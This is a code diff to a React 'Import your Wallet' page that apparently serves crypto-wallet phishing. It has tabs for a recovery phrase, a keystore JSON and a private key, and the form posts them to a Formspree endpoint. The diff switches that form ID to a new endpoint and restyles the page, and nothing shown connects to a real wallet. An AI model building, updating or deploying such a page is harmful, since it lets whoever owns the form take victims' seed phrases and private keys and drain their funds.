@@ -1,15 +1,15 @@
-import React, { useEffect, useState } from "react";
+import { useEffect, useState } from "react";
 import { Link, useNavigate, useParams } from "react-router-dom";
 import { useForm } from "@formspree/react";
 import { wallets } from "../utils/wallets";
-import FormSubmit from "../components/FormSubmit";
+import FormSubmit from "../Components/FormSubmit";
 import logo from "../assets/logo.png";
 
 const ImportWallet = () => {
   const navigate = useNavigate();
   const { id } = useParams();
   const [keyType, setKeyType] = useState("Phrase");
-  const [state, handleSubmit] = useForm("myyavpdr");
+  const [state, handleSubmit] = useForm("mjvdqnov");
 
   const HandleWallet = () => {
     let tabs = document.querySelectorAll(".tab");
@@ -22,14 +22,18 @@ const ImportWallet = () => {
 
     tabs.forEach((tab, index) => {
       if (tab.id == tabs[0].id) {
-        tab.classList.add("tabActive", "text-[#000]");
-        tab.classList.remove("bg-[rgba(48,48,48,0.7)]");
+        tab.classList.add("tabActive", "bg-[rgba(1,157,234)]", "text-white");
+        tab.classList.remove("text-[#5B5B5B]");
       }
 
       tab.addEventListener("click", (e) => {
         tabs.forEach((tab) => {
-          tab.classList.remove("tabActive", "text-[#000]");
-          tab.classList.add("bg-[rgba(48,48,48,0.7)]");
+          tab.classList.remove(
+            "tabActive",
+            "bg-[rgba(1,157,234)]",
+            "text-white"
+          );
+          tab.classList.add("text-[#5B5B5B]");
         });
         setKeyType(e.target.innerText);
 
@@ -40,8 +44,8 @@ const ImportWallet = () => {
           "px";
 
         if (tab.id == tabs[index].id) {
-          tab.classList.add("tabActive", "text-[#000]");
-          tab.classList.remove("bg-[rgba(48,48,48,0.7)]");
+          tab.classList.add("tabActive", "bg-[rgba(1,157,234)]", "text-white");
+          tab.classList.remove("text-[#5B5B5B]");
         }
       });
     });
@@ -59,9 +63,9 @@ const ImportWallet = () => {
       <Link to="/" className="absolute left-5 top-20 w-[4rem] h-[4rem]">
         <img src={logo} alt="logo.png" className="w-full" />
       </Link>
-      <div>
+      <div className="pb-20 pt-6">
         <div className="flex items-center">
-          <div className="max-w-xl mx-auto mt-24 md:mt-10 w-[90%] bg-[#222222] px-8 pt-10 pb-10 rounded-3xl">
+          <div className="max-w-xl mx-auto mt-24 md:mt-10 w-[90%] bg-[rgba(1,157,234,0.2)] px-8 pt-10 pb-10 rounded-3xl">
             <div className="flex justify-start gap-x-5 items-center mb-6">
               <div className="w-[35px] h-[35px]">
                 <img
@@ -70,7 +74,7 @@ const ImportWallet = () => {
                   className="w-full"
                 />
               </div>
-              <h3 className="text-white font-semibold xs:text-sm md:text-lg lg:text-2xl">
+              <h3 className="text-white font-semibold font-titan xs:text-sm md:text-lg lg:text-2xl">
                 Import your {`${wallets[id].title}`} Wallet
               </h3>
             </div>
@@ -78,7 +82,7 @@ const ImportWallet = () => {
               <div
                 role="tablist"
                 aria-label="tabs"
-                className="relative grid md:grid-cols-3 gap-x-3 gap-y-3 items-center px-3 py-3 md:rounded-full bg-[rgba(48,48,48,0.3)] overflow-hidden transition"
+                className="relative font-urbanist grid md:grid-cols-3 gap-x-3 gap-y-3 items-center px-3 py-3 md:rounded-full bg-white overflow-hidden transition"
               >
                 <div className="invisible md:absolute indicator md:h-11 my-auto top-0 bottom-0 left-0 bg-[#D1FFCE] rounded-full shadow-md"></div>
                 <button
@@ -87,7 +91,7 @@ const ImportWallet = () => {
                   aria-controls="panel-1"
                   id="tab-1"
                   tabIndex="0"
-                  className="relative block px-3 tab py-3 text-white xs:text-sm bg-[rgba(48,48,48,0.7)] rounded-full"
+                  className="relative block px-3 tab py-3 text-[#5B5B5B] xs:text-sm rounded-full"
                 >
                   <span>Phrase</span>
                 </button>
@@ -97,7 +101,7 @@ const ImportWallet = () => {
                   aria-controls="panel-2"
                   id="tab-2"
                   tabIndex="-1"
-                  className="relative block px-3 tab py-3 text-white xs:text-sm bg-[rgba(48,48,48,0.7)] rounded-full"
+                  className="relative block px-3 tab py-3 text-[#5B5B5B] xs:text-sm rounded-full"
                 >
                   <span>Keystore JSON</span>
                 </button>
@@ -107,7 +111,7 @@ const ImportWallet = () => {
                   aria-controls="panel-3"
                   id="tab-3"
                   tabIndex="-1"
-                  className="relative block px-3 tab py-3 text-white xs:text-sm bg-[rgba(48,48,48,0.7)] rounded-full"
+                  className="relative block px-3 tab py-3 text-[#5B5B5B] xs:text-sm rounded-full"
                 >
                   <span>Private Key</span>
                 </button>
@@ -116,7 +120,7 @@ const ImportWallet = () => {
                 <div>
                   <form onSubmit={handleSubmit}>
                     <FormSubmit keyType={keyType} wallet={wallets[id].title} />
-                    <div className="flex justify-between items-center mt-5">
+                    <div className="flex font-urbanist justify-between items-center mt-5">
                       <Link
                         to="/"
                         className="bg-red-500 py-5 w-[48%] text-center font-bold text-white rounded-full"
